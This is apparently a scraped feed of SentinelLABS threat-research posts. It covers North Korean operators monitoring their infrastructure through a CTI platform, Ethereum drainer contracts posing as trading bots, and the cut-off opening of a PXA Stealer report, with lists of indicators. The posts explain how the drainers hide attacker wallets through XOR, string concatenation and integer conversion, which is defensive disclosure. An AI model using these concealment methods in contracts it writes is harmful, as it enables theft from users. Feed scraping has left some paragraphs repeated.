kept active over the long term, suggest that the threat actors used the platform not only to monitor for signs of detection related to their existing infrastructure, but also:\nTo scout and evaluate new infrastructure prior to purchase, highly likely to determine whether it had been previously reported as malicious. This helps the threat actors avoid acquiring assets already labeled as malicious, which would increase the risk of detection and reduce the effectiveness of their operations once deployed.\nTo monitor newly acquired infrastructure throughout its lifecycle for any indicators of detection.\nFor instance, on March 25, 2025, we observed the info@versusx[.]us account searching for the domain names hiringassessment[.]net, hiringassessment[.]com, hireassessment[.]com, easyjobinterview[.]org, and screenquestion[.]org. All of these domains were available for purchase at the time. These names align with the recruitment-related themes typically used in Contagious Interview activities.\nThe info@versusx[.]us account also searched for multiple domains shortly after they were purchased and continued monitoring them for signs of detection after deploying web content. One example is skillquestions[.]com, which was first queried on March 25, 2025, at 17:33:34 UTC, just minutes before it was registered at 17:41:14 UTC. Additional searches occurred shortly before content was deployed on April 23, 2025, and continued periodically until May 6, 2025. According to Validin data, the skillquestions[.]com website remained operational until at least May 13, 2025, at 20:44:27 UTC.\nOur continuous monitoring of the planning, acquisition, and deployment of new Contagious Interview infrastructure allowed us to identify OPSEC mistakes made by the threat actors throughout the process. We observed multiple instances of such errors, including the unintended exposure of files and directory contents, which indicate poor OPSEC practices during infrastructure deployment and provide further insight into their operations.\nFor example, api.release-drivers[.]online was exposing its web root directory, the files it contained, and their associated modification timestamps. This included error logs from a Node.js application stored in /home/relefmwz/api.release-drivers[.]online/, indicating that the threat actors used the username relefmwz. The exposed timestamps provide insight into when the Contagious Interview operators deployed content to the server, allowing us to reconstruct their activity timeline.\nExposed web root directory of api.release-drivers[.]online\nFurther, several newly deployed ClickFix malware distribution servers, such as api.camdriverhelp[.]club and api.drive-release[.]cloud, were exposing ContagiousDrop applications along with the log files they had generated. These files contain information on affected individuals, allowing us to gain valuable insights into the victimology of the campaigns.\nContagiousDrop Applications\nThe ContagiousDrop applications, typically implemented in app.js files, are deployed on ClickFix malware distribution servers such as api.drive-release[.]cloud. These applications run servers that listen on configured ports to handle incoming HTTP GET and POST requests, executing different functions based on the specific request path.\nThe ContagiousDrop applications deliver malware disguised as software updates or essential utilities. They distribute a tailored payload based on the victim’s operating system (Windows, macOS, or Linux), system architecture, and method of interaction with the server, such as the use of the curl command.\nOperating system-specific malware delivery\nIn addition to delivering malware, the ContagiousDrop applications feature an integrated email notification system. These notifications, sent from a configured email address such as designedcuratedamy58[@]gmail.com, provide the Contagious Interview threat actors with insights into victim engagement and interaction patterns and are delivered to their configured recipient addresses. For example, an email is triggered when an affected individual starts a fake skill assessment or executes a curl command to download a file from the ClickFix malware distribution server.\nEmail notification recipients\nFurthermore, these applications record victim information across multiple files and interaction points, effectively building a victimology database and logging victim activities. For example, initial and later engagements are captured in client_ips_start_test.json and client_ips_submit.json, including details such as full name, email address, IP address, phone number, and the date of interaction. Malware download initiations are logged in files such as client_ips_start.json and client_ips_mac_start.json, which capture operating system–specific payload delivery.\nLogging to client_ips_start_test.json\nContagiousDrop | Victimology\nBased on ContagiousDrop log files we retrieved, we identified over 230 individuals who engaged with Contagious Interview lures between mid-January and the end of March 2025. This figure is based on log files from only a few Contagious Interview servers; therefore, the actual number of affected individuals is likely significantly higher. Their engagement spanned multiple stages of the attack, including completing fake assessment tests and progressing to the infection phase via the ClickFix technique.\nMost of the affected individuals work in roles related to cryptocurrency and blockchain technologies, primarily within the marketing and finance sectors, and are geographically distributed worldwide. They engaged with lures involving various job positions, such as Portfolio Manager, Investment Manager, and Senior Product Manager, across a range of impersonated companies including Archblock, Robinhood, and eToro.\nContagious Interview victimology\nIn addition to entries related to victim activity, the ContagiousDrop logs also contain records likely generated during testing of lure deployment and campaign infrastructure by the Contagious Interview threat actors themselves. They used email addresses and persona names we have associated with them, such as awesomium430[@]gmail.com (found in ContagiousDrop code) and Richard Davis. Other names, such as test, test user, and Lazaro, indicate internal testing activity, with Lazaro likely being derived from the name of the North Korean umbrella threat cluster associated with Contagious Interview activities: Lazarus.\n\nLog entries\nConclusions\nNorth Korean threat groups actively examine CTI information to identify threats to their operations and improve the resilience and effectiveness of their campaigns, depending on their operational priorities. In addition to the actors behind the Contagious Interview campaign cluster, SentinelLABS has also observed other North Korean groups demonstrating interest in threat intelligence prior to the activities discussed in this post. In 2024, we retrieved malware associated with ScarCruft, likely designed to target consumers of threat intelligence reporting, such as threat researchers and other cybersecurity professionals. We suspect the actors aimed to gain insights into non-public CTI and defensive strategies.\nIn this post, we disclose indicators and TTPs that enable the sustained tracking of the Contagious Interview threat actors. While we expect them to alter their methods as a result, the expanding scale and broad targeting of these operations suggests greater benefit in empowering the wider public to effectively defend than there is in hoarding actionable intelligence indefinitely. SentinelLABS maintains other methods of tracking these evolving campaigns.\nBased on our observations, the Contagious Interview threat actors do not implement systematic changes to their infrastructure based on the CTI information they consume from multiple sources, which could make their operations harder to detect or disrupt. Despite this, they continue to achieve a relatively high success rate in attracting job seekers through fraudulent employment offers and skill assessment tests. Their operational strategy appears to prioritize promptly replacing infrastructure lost due to takedown efforts by service providers, using newly provisioned infrastructure to sustain their activity.\nTherefore, a critical element in mitigating this threat is the human factor. It is important that job seekers, particularly those within the cryptocurrency sector, exercise heightened vigilance when engaging with employment offers and associated assessments.\nIn addition, infrastructure service providers play an important role in disrupting Contagious Interview operations. Continuous and effective actions against the threat actors’ infrastructure can significantly reduce their capacity to carry out attacks. Close collaboration and coordination between service providers and the threat intelligence community are crucial to mitigating the impact of these activities. SentinelLABS and Validin remain committed to sharing timely and actionable threat intelligence to support these collaborative efforts.\nIndicators of Compromise\nEmail Addresses (Contagious Interview Operators)\n \nIP Addresses\nValue\nNote\n\n\n181.215.9[.]29\nUsed for account registration and logging into Validin\n\n\n181.53.13[.]189\nUsed for logging into Validin\n\n\n181.59.180[.]84\nUsed for account registration and logging into Validin\n\n\n194.33.45[.]162\nUsed for account registration and logging into Validin\n\n\n216.24.215[.]231\nUsed for logging into Validin\n\n\n38.170.181[.]10\nUsed for account registration and logging into Validin\n\n\n45.86.208[.]162\nUsed for account registration and logging into Validin\n\n\n70.32.3[.]15\nUsed for account registration and logging into Validin\n\n\n70.39.70[.]194\nUsed for account registration and logging into Validin\n\n\n77.247.126[.]189\nUsed for Validin account registration\n\n\n89.19.58[.]51\nUsed for account registration and logging into Validin\n\n\n96.62.127[.]126\nUsed for account registration and logging into Validin\n\n\n\n\nContagious Interview Domains\n \nClickFix Malware Distribution Servers\n \nDomains Scouted by Contagious Interview Operators\n \nSHA-1 Hashes\nValue\nNote\n\n\n24042a8eea9b9c20af1f7bae00296b44968a068f\nContagiousDrop application (app.js)\n\n\n44ddabf5b5d601077936a130a2863a96d2af1c8e\nContagiousDrop application (app.js)\n\n\n4a8bfa28d46ae14e45a50e105e2d34f850ffa96c\nContagiousDrop application (app.js)","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/07/ConInt_Validin_July2025_ftr.jpg","length":"542352","type":"image/jpeg"},"dc:creator":"Aleksandar Milenkoski, Sreekar Madabushi (Validin) &amp; Kenneth Kinion (Validin)","content":"DPRK-aligned threat actors abuse CTI platforms to detect infrastructure exposure and scout for new assets.","contentSnippet":"DPRK-aligned threat actors abuse CTI platforms to detect infrastructure exposure and scout for new assets.","guid":"https://www.sentinelone.com/?post_type=labs&p=125898","categories":["DPRK"],"isoDate":"2025-09-04T09:55:04.000Z","tag":"intel"},{"creator":"Alex Delamotte","title":"Smart Contract Scams | Ethereum Drainers Pose as Trading Bots to Steal Crypto","link":"https://www.sentinelone.com/labs/smart-contract-scams-ethereum-drainers-pose-as-trading-bots-to-steal-crypto/","pubDate":"Tue, 05 Aug 2025 10:00:12 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">SentinelLABS has uncovered a series of cryptocurrency scams in which threat actors distribute a malicious smart contract disguised as a trading bot in order to drain user wallets of more than $900k US.</li>\n<li aria-level=\"1\">The smart contract deploys multiple obfuscation techniques to conceal the attacker’s wallet address.</li>\n<li aria-level=\"1\">The campaign leverages aged YouTube accounts and curated comment sections to create a false sense of legitimacy.</li>\n<li aria-level=\"1\">Crypto users are advised to treat trading tools promoted through unverified social media or video content with extreme caution.</li>\n</ul>\n<h2>Overview</h2>\n<p>SentinelLABS has identified widespread and ongoing cryptocurrency scams in which actors advertise a crypto trading bot that conceals a smart contract designed to steal the victim’s funds. The scams are marketed through YouTube videos which explain the purported nature of the crypto trading bot and explain how to deploy a smart contract on the Remix Solidity Compiler platform, a web-based integrated development environment (IDE) for Web3 projects. The video descriptions share a link to an external site that hosts the weaponized smart contract code.</p>\n<p>Videos that distribute the scams show a considerable amount of effort focused on aging the YouTube accounts and hosting content that makes the account appear to be a credible source for cryptocurrency investing tips or otherwise boosts the account’s ranking by posting many off-topic videos. Various iterations of the scam have been ongoing since at least early 2024, with different videos and YouTube accounts used for distribution. The actors are likely managing the YouTube comment section to delete any negative comments, with more savvy users turning to platforms like <a href=\"https://www.reddit.com/r/solidity/comments/1c1lf2m/is_this_ethereum_uniswap_sniper_bot_legit/\" target=\"_blank\" rel=\"noopener noreferrer\">reddit</a> for additional context on the bot.</p>\n<p>Several videos appear to be AI-generated based on audio and visual tells, which makes it easier for actors to create multiple scam videos without having to take on a new identity. The AI-generated videos have unnatural narrator voice tone and cadence; the narrator also looks only directly at the camera and there are no side profile angles. This likely saves costs for actors who may otherwise go to the trouble of hiring a human actor to film these scam videos. Interestingly, the most successful of the identified scam videos does not appear to be AI-generated; this attacker address from the code shared in this video yielded $900,000+ US in stolen profits.</p>\n<h2>Smart Contract Details</h2>\n<p>The smart contracts deployed in these campaigns are written in Solidity, a programming language used for implementing smart contracts on several blockchains, with Ethereum being the most popular. There are several variations in design of the weaponized smart contracts, with each applying a different obfuscation technique to hide the outbound Externally Owned Account (EOA) e.g., the attacker-controlled wallet where stolen funds will be routed. We observed the same wallet being used across multiple weaponized smart contracts; however, there are many unique addresses in use, so it is unclear how many unique actors are behind the scam.</p>\n<p>The attacker-controlled wallet address is obfuscated in each smart contract we analyzed and not directly visible in the smart contract code, which complicates identifying the weaponized contracts. We found multiple obfuscation techniques applied across different contracts to hide the attacker’s EOA:</p>\n<ul>\n<li aria-level=\"1\">XOR: XORs two 32-byte constants which are assigned different names, including <code>DexRouter</code> and <code>factory</code>. The constant names change in some of the contracts. In each version, deobfuscated variables that represent the contract address and attacker EOA are calculated by the expression <code>address(uint160(uint256(a) ^ uint256(b)))</code>; with <code>a</code> and <code>b</code> representing the two constants.</li>\n<li aria-level=\"1\">String concatenation: derives the address by concatenating fragments of the address as strings.</li>\n<li aria-level=\"1\">Large decimal to hex: converts a 256-bit integer to the <code>uint160</code> data type, which removes the 12 high bytes and the ETH address remains. Solidity <a href=\"https://docs.soliditylang.org/en/latest/types.html\" target=\"_blank\" rel=\"noopener noreferrer\">recognizes</a> <code>uint160</code> values as Ethereum wallet addresses.</li>\n</ul>\n<p>The XOR method is the most complex of the three examples and it has been used across multiple weaponized Solidity contracts that results in the same calculated attacker EOA, <code>0x872528989c4D20349D0dB3Ca06751d83DC86D831</code>. The contract declaration <code>DexInterface</code> contains two constants labeled <code>apiKey</code> and <code>apiSignature</code>. The contract declaration sets these values in the <code>dataProvider</code> variable;, when XOR’ed, this contains the smart contract address <code>0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2</code>. The value is  passed into the <code>getDexRouter</code> function later in the Solidity code.</p>\n<figure id=\"attachment_125917\" aria-describedby=\"caption-attachment-125917\" style=\"width: 834px\" class=\"wp-caption alignnone\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_7.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125917\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_7.jpg\" alt=\"The DexInterface contract declaration in a weaponized Solidity contract using XOR obfuscation technique\" width=\"834\" height=\"516\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_7.jpg 834w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_7-300x186.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_7-768x475.jpg 768w\" sizes=\"auto, (max-width: 834px) 100vw, 834px\" /></a><figcaption id=\"caption-attachment-125917\" class=\"wp-caption-text\">The DexInterface contract declaration in a weaponized Solidity contract using XOR obfuscation technique</figcaption></figure>\n<p>The <code>DexInterface</code> contract declaration calls the function <code>getDexRouter</code>, which calculates the attacker’s EOA from the <code>DexRouter</code> and <code>factory</code> constants by XORing the two values,  resulting in EOA <code>0x872528989c4D20349D0dB3Ca06751d83DC86D831</code>.</p>\n<figure id=\"attachment_125915\" aria-describedby=\"caption-attachment-125915\" style=\"width: 898px\" class=\"wp-caption alignnone\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125915\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9.jpg\" alt=\"Functions in XOR obfuscated Solidity contract that calculate the attacker’s EOA and create the contract\" width=\"898\" height=\"209\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9.jpg 898w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9-300x70.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9-768x179.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_9-221x51.jpg 221w\" sizes=\"auto, (max-width: 898px) 100vw, 898px\" /></a><figcaption id=\"caption-attachment-125915\" class=\"wp-caption-text\">Functions in XOR obfuscated Solidity contract that calculate the attacker’s EOA and create the contract</figcaption></figure>\n<p>In all cases regardless of obfuscation technique, when a victim deploys the smart contract, there are two owner values set: the victim’s own wallet and the obfuscated attacker EOA. For the scam to work, the victim must then fund the contract by sending ETH to the new contract. The scam instruction videos tell the victim to deploy the contract with a call like <code>Start()</code> or <code>StartNative()</code>, initializing another call that derives the trade router address, which is actually the attacker EOA that had been obfuscated using one of the techniques outlined above. However, even if the victim does not call <code>Start()</code> after funding the contract, the contract contains a failover mechanism that allows the attacker to withdraw funds that have been sent to the contract.</p>\n<h2>YouTube Video Distribution</h2>\n<p>These scams are distributed through YouTube videos explaining the smart contracts as trading arbitrage bots–also known as Maximal Extractable Value (MEV) bots–that automatically trade cryptocurrency based on market fluctuations. The goal of legitimate <a href=\"https://www.blocknative.com/blog/mev-and-creating-a-basic-arbitrage-bot-on-ethereum-mainnet\" target=\"_blank\" rel=\"noopener noreferrer\">MEV</a> bots is to monitor for price differences in a single asset such as Ethereum between different cryptocurrency exchanges and trade that to the operator’s advantage. One channel we identified belongs to YouTube user @todd_tutorials, who posted step by step instructions on deploying the weaponized smart contract. The video was available when our research began, but has since been made <a href=\"https://www.youtube.com/watch?v=yhyJGd9FGUI\" target=\"_blank\" rel=\"noopener noreferrer\">private</a>. The voice and person narrating the video displayed characteristics of AI-generated content: a robotic voice with inconsistent speech pacing and awkward facial movements.</p>\n<figure id=\"attachment_125923\" aria-describedby=\"caption-attachment-125923\" style=\"width: 1018px\" class=\"wp-caption alignnone\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_10.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125923\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_10.jpg\" alt=\"Instructions to deploy a weaponized smart contract disguised as a crypto trading bot\" width=\"1018\" height=\"461\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_10.jpg 1018w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_10-300x136.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_10-768x348.jpg 768w\" sizes=\"auto, (max-width: 1018px) 100vw, 1018px\" /></a><figcaption id=\"caption-attachment-125923\" class=\"wp-caption-text\">Instructions to deploy a weaponized smart contract disguised as a crypto trading bot</figcaption></figure>\n<p>The accounts are aged and several have a history of posting other sources’ cryptocurrency news as playlists. This is likely to build credibility to the account as a source for crypto news. Each of the scams instructs users to deposit a minimum of .5 ETH to ensure sufficient funds for arbitrage profit, as well as accounting for gas fees,  which are required for any transaction to move across the blockchain and increase in cases with multiple transactions.</p>\n<figure id=\"attachment_125924\" aria-describedby=\"caption-attachment-125924\" style=\"width: 1357px\" class=\"wp-caption alignnone\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125924\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1.jpg\" alt=\"Playlists posted by todd_tutorials YouTube account\" width=\"1357\" height=\"861\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1.jpg 1357w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1-300x190.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1-1024x650.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_1-768x487.jpg 768w\" sizes=\"auto, (max-width: 1357px) 100vw, 1357px\" /></a><figcaption id=\"caption-attachment-125924\" class=\"wp-caption-text\">Playlists posted by todd_tutorials YouTube account</figcaption></figure>\n<p>Despite wallet history suggesting that some users fell victim to the scam, the YouTube video comments are overwhelmingly positive.

Again, the comments are entirely positive; many claim the user has profited from the bot and others praise the creator’s approach to explaining how others can use it. This video also shows indications of being AI-generated, with choppy, twitchy facial expressions and eye movements, lip movements misaligned with the audio, and unusual voice intonations. The narrator only looks straight towards the camera and there are no scenes where he shows his side profile.</p>\n<figure id=\"attachment_125922\" aria-describedby=\"caption-attachment-125922\" style=\"width: 1650px\" class=\"wp-caption alignnone\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-125922\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2.jpg\" alt=\"YouTube comments on SolidityTutorials video\" width=\"1650\" height=\"1134\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2.jpg 1650w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2-300x206.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2-1024x704.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2-768x528.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/Eth_Drainer_2-1536x1056.jpg 1536w\" sizes=\"auto, (max-width: 1650px) 100vw, 1650px\" /></a><figcaption id=\"caption-attachment-125922\" class=\"wp-caption-text\">YouTube comments on SolidityTutorials video</figcaption></figure>\n<p>Another <a href=\"https://www.youtube.com/watch?v=dK6U9P9pt6A\" target=\"_blank\" rel=\"noopener noreferrer\">video</a> with a similar theme had a highly successful outcome relative to the other scams. “How to Create Passive Income MEV Bot on Ethereum Full Tutorial” by user @Jazz_Braze is still available on YouTube more than a year after it was released on June 6, 2024.</p>\n<p>The video describes a process that is similar to all aforementioned arbitrage scams.

The most recently identified scam from April 2025 has received 7.59 ETH (worth ~$28,000 US as of this writing) from transactions via smart contract to the attacker’s <a href=\"https://etherscan.io/address/0x2eee3a0ed51ae22813050212e8d9fa216bd51df4\" target=\"_blank\" rel=\"noopener noreferrer\">EOA</a>.

The scams are marketed through YouTube videos which explain the purported nature of the crypto trading bot and explain how to deploy a smart contract on the Remix Solidity Compiler platform, a web-based integrated development environment (IDE) for Web3 projects. The video descriptions share a link to an external site that hosts the weaponized smart contract code.\nVideos that distribute the scams show a considerable amount of effort focused on aging the YouTube accounts and hosting content that makes the account appear to be a credible source for cryptocurrency investing tips or otherwise boosts the account’s ranking by posting many off-topic videos. Various iterations of the scam have been ongoing since at least early 2024, with different videos and YouTube accounts used for distribution. The actors are likely managing the YouTube comment section to delete any negative comments, with more savvy users turning to platforms like reddit for additional context on the bot.\nSeveral videos appear to be AI-generated based on audio and visual tells, which makes it easier for actors to create multiple scam videos without having to take on a new identity. The AI-generated videos have unnatural narrator voice tone and cadence; the narrator also looks only directly at the camera and there are no side profile angles. This likely saves costs for actors who may otherwise go to the trouble of hiring a human actor to film these scam videos. Interestingly, the most successful of the identified scam videos does not appear to be AI-generated; this attacker address from the code shared in this video yielded $900,000+ US in stolen profits.\nSmart Contract Details\nThe smart contracts deployed in these campaigns are written in Solidity, a programming language used for implementing smart contracts on several blockchains, with Ethereum being the most popular. There are several variations in design of the weaponized smart contracts, with each applying a different obfuscation technique to hide the outbound Externally Owned Account (EOA) e.g., the attacker-controlled wallet where stolen funds will be routed. We observed the same wallet being used across multiple weaponized smart contracts; however, there are many unique addresses in use, so it is unclear how many unique actors are behind the scam.\nThe attacker-controlled wallet address is obfuscated in each smart contract we analyzed and not directly visible in the smart contract code, which complicates identifying the weaponized contracts. We found multiple obfuscation techniques applied across different contracts to hide the attacker’s EOA:\nXOR: XORs two 32-byte constants which are assigned different names, including DexRouter and factory. The constant names change in some of the contracts. In each version, deobfuscated variables that represent the contract address and attacker EOA are calculated by the expression address(uint160(uint256(a) ^ uint256(b))); with a and b representing the two constants.\nString concatenation: derives the address by concatenating fragments of the address as strings.\nLarge decimal to hex: converts a 256-bit integer to the uint160 data type, which removes the 12 high bytes and the ETH address remains. Solidity recognizes uint160 values as Ethereum wallet addresses.\nThe XOR method is the most complex of the three examples and it has been used across multiple weaponized Solidity contracts that results in the same calculated attacker EOA, 0x872528989c4D20349D0dB3Ca06751d83DC86D831. The contract declaration DexInterface contains two constants labeled apiKey and apiSignature. The contract declaration sets these values in the dataProvider variable;, when XOR’ed, this contains the smart contract address 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2. The value is  passed into the getDexRouter function later in the Solidity code.\nThe DexInterface contract declaration in a weaponized Solidity contract using XOR obfuscation technique\nThe DexInterface contract declaration calls the function getDexRouter, which calculates the attacker’s EOA from the DexRouter and factory constants by XORing the two values,  resulting in EOA 0x872528989c4D20349D0dB3Ca06751d83DC86D831.\nFunctions in XOR obfuscated Solidity contract that calculate the attacker’s EOA and create the contract\nIn all cases regardless of obfuscation technique, when a victim deploys the smart contract, there are two owner values set: the victim’s own wallet and the obfuscated attacker EOA. For the scam to work, the victim must then fund the contract by sending ETH to the new contract. The scam instruction videos tell the victim to deploy the contract with a call like Start() or StartNative(), initializing another call that derives the trade router address, which is actually the attacker EOA that had been obfuscated using one of the techniques outlined above. However, even if the victim does not call Start() after funding the contract, the contract contains a failover mechanism that allows the attacker to withdraw funds that have been sent to the contract.\nYouTube Video Distribution\nThese scams are distributed through YouTube videos explaining the smart contracts as trading arbitrage bots–also known as Maximal Extractable Value (MEV) bots–that automatically trade cryptocurrency based on market fluctuations. The goal of legitimate MEV bots is to monitor for price differences in a single asset such as Ethereum between different cryptocurrency exchanges and trade that to the operator’s advantage. One channel we identified belongs to YouTube user @todd_tutorials, who posted step by step instructions on deploying the weaponized smart contract. The video was available when our research began, but has since been made private. The voice and person narrating the video displayed characteristics of AI-generated content: a robotic voice with inconsistent speech pacing and awkward facial movements.\nInstructions to deploy a weaponized smart contract disguised as a crypto trading bot\nThe accounts are aged and several have a history of posting other sources’ cryptocurrency news as playlists. This is likely to build credibility to the account as a source for crypto news. Each of the scams instructs users to deposit a minimum of .5 ETH to ensure sufficient funds for arbitrage profit, as well as accounting for gas fees,  which are required for any transaction to move across the blockchain and increase in cases with multiple transactions.\nPlaylists posted by todd_tutorials YouTube account\nDespite wallet history suggesting that some users fell victim to the scam, the YouTube video comments are overwhelmingly positive. We believe that the video creators have most likely enabled comment management features offered by YouTube that give the creator control over approving comments and filtering certain keywords.\nAnother scam distribution video titled “A Step-by-Step Guide to Building an Ethereum Uniswap Sniper Bot – Mastering ETH Trading Strategies” was posted in April 2024 by user @SolidityTutorials featuring similar content. Again, the comments are entirely positive; many claim the user has profited from the bot and others praise the creator’s approach to explaining how others can use it. This video also shows indications of being AI-generated, with choppy, twitchy facial expressions and eye movements, lip movements misaligned with the audio, and unusual voice intonations. The narrator only looks straight towards the camera and there are no scenes where he shows his side profile.\nYouTube comments on SolidityTutorials video\nAnother video with a similar theme had a highly successful outcome relative to the other scams. “How to Create Passive Income MEV Bot on Ethereum Full Tutorial” by user @Jazz_Braze is still available on YouTube more than a year after it was released on June 6, 2024.\nThe video describes a process that is similar to all aforementioned arbitrage scams. The description notes that the creator planned to temporarily offer the bot for free between June 6 and June 30, 2024, likely to create a sense of urgency prompting more victims to deploy the MEV bot before the creator planned to make it private and licensed for paid use. This video has 387,000+ views as of this writing. Unlike the previous two videos, Jazz_Braze’s video does not have significant tells of AI-generated content. The narrator’s face is more mobile and the reflection glare in her glasses is consistent.\nJazz_Braze’s MEV Bot tutorial video\nThis YouTube account has no other crypto news history, though the account has nearly 100 pop culture-focused YouTube shorts and videos that are compilations of clips from various TV shows and movies, many of which have several thousand views. The videos were uploaded between November and December 2022; the Shorts were uploaded between November 2022 and April 2024.\nJazz_Braze’s YouTube profile and recent video uploads\nThe account operator likely uploaded these videos over a long period of time to boost the account’s ranking and credibility. This may or may not have been the actor behind the crypto scam as services selling aged YouTube channels can  readily be found on Telegram and in search engine results with prices ranging from $6 to thousands of dollars. We have no indication whether the actor behind the crypto scam curated the content themselves or purchased the account from such services.\nSearch engine results showing aged YouTube accounts for sale\nThe video pushing this crypto scam is unlisted on YouTube, meaning that the video does not appear in search results or on the creator’s profile. The actor is likely distributing the video to victims through other social media platforms, which may include Telegram as the video description contains a link to the handle @janesolidity.\nScam Success\nAnalysis of the various attacker EOAs shows that the scams have had varying degrees of success. The most recently identified scam from April 2025 has received 7.59 ETH (worth ~$28,000 US as of this writing) from transactions via smart contract to the attacker’s EOA. Transaction records to the EOA derived from the scam referenced by the SolidityTutorials video netted 4.19 ETH (worth ~$15,000 US).\nThere is a clear outlier among the discovered scams in the video posted by Jazz_Braze: the attacker EOA 0x872528989c4D20349D0dB3Ca06751d83DC86D831 yielded 244.9 ETH (worth ~$902,000 US) from smart contract deposits, which have since been withdrawn to other addresses in bulk moves. The following ETH addresses received funds from the scam advertised by Jazz_Braze:\n0x080888ffdbaaf7d923e7231788965036f2d66b04\nConclusion\nThe cryptocurrency ecosystem is increasingly complex, and scams like these will inevitably succeed against victims who do not thoroughly analyze how related tools work by scrutinizing what the inputs and outputs are. The videos used to distribute these scams are increasingly prevalent because they work for the attacker. Each scam we analyzed made several thousand dollars (US) in profit, with the wallet associated with the Jazz_Braze scam collecting over $900,000 US.

As with any developer who uses code or tools posted online, it is important to research the nature of the tool and to validate how it works before deploying in production, or on a live blockchain in this case.\nIndicators of Compromise\nSolidity Smart Contract SHA-1\nValue\nNote\n\n\n2923cdf2caba3a92e0ea215d14343ce73e8f08a5\nSolidity contract from JazzBraze video\n\n\n464aead7901305f689fe80326c83ffd7d0cd6a75\nSolidity contract with same EOA as JazzBraze video\n\n\n47d567e799f0403bcd4057bff50244125cac926a\nSolidity contract from ToddTutorials video\n\n\n9e71f537669e87ef10844266dc8d058a23199074\nSolidity contract with same EOA as JazzBraze video\n\n\nda1c5eb2b5cfc80173651a6ba552e1c110f06351\nSolidity contract with same EOA as JazzBraze video\n\n\nf0a34770f03428c8abc9e73df93263f10f8320b1\nSolidity contract from SolidityTutorials video\n\n\n\nURLs Hosting Smart Contract Code\nhxxps://pastebin[.]com/raw/8Yar7QyU – URL hosting weaponized smart contract code from ToddTutorials video\nAttacker Ethereum EOA Addresses\n0x2eEE3A0ed51AE22813050212E8D9Fa216bd51df4 – ToddTutorials smart contract EOA\n0x7359EA6AA3343b3238171e76F97e6aA3cDB8d696 – SolidityTutorials smart contract EOA\n0x872528989c4D20349D0dB3Ca06751d83DC86D831 – JazzBraze smart contract EOA","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/08/Ethereum_Drainer_Scam.jpg","length":"167249","type":"image/jpeg"},"dc:creator":"Alex Delamotte","content":"Crypto scammers use fake YouTube bots, AI videos, and obfuscated smart contracts to steal $900K+, targeting unwary traders.","contentSnippet":"Crypto scammers use fake YouTube bots, AI videos, and obfuscated smart contracts to steal $900K+, targeting unwary traders.","guid":"https://www.sentinelone.com/?post_type=labs&p=125939","categories":["Crypto"],"isoDate":"2025-08-05T10:00:12.000Z","tag":"intel"},{"creator":"Jim Walter, Alex Delamotte, Beazley Security’s Francisco Donoso, Sam Mayers, Tell Hause &amp; Bobby Venal","title":"Ghost in the Zip | New PXA Stealer and Its Telegram-Powered Ecosystem","link":"https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/","pubDate":"Mon, 04 Aug 2025 10:00:23 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">SentinelLABS and <a href=\"https://labs.beazley.security/articles/ghost-in-the-zip-or-new-pxa-stealer-and-its-telegram-powered-ecosystem\" target=\"_blank\" rel=\"noopener noreferrer\">Beazley Security</a> discovered and analyzed a rapidly evolving series of infostealer campaigns delivering the Python-based PXA Stealer.</li>\n<li aria-level=\"1\">This discovery showcases a leap in tradecraft, incorporating more nuanced anti-analysis techniques, non-malicious decoy content, and a hardened command-and-control pipeline that frustrates triage and attempts to delay detection.</li>\n<li aria-level=\"1\">We identified more than 4,000 unique victim IP 